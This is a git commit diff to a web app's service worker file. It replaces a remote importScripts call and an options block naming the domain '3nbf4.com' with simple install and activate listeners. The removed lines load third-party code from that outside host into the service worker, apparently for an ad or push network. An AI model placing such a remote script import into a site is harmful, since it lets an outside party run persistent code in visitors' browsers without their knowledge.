838467f8f0702c40cb866147bcd4ba614eb6dc9f
mufoasa <96444527+mufoasa@users.noreply.github.com>
2026-02-24 04:50:24 +0100

    Add install and activate event listeners to sw.js

--- public/sw.js
+++ public/sw.js
@@ -1,6 +1,7 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10646758
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+self.addEventListener('install', function () {
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', function (event) {
+    event.waitUntil(self.clients.claim());
+});
